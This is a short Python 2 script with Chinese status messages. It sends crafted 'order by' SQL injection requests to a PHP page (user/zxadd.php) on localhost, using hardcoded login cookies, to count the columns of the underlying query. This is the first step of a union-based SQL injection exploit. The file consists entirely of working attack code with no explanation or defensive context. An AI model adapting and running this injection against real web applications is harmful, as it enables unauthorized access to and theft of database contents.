# -*- coding=utf-8 -*-
import requests
import hashlib
import re

cookies = {
  "UserName":"spook",
  "PassWord":hashlib.md5("spook").hexdigest()
}
length=0
print "[+] 开始查字段数···"
for i in xrange(20):
  url = "http://localhost/user/zxadd.php?b=0 order by {num}%23".format(num=i)
  r = requests.get(url, cookies=cookies, timeout=5)
  if 'line' not in r.content:
    length += 1
print "[+] 字段数为"+str(length)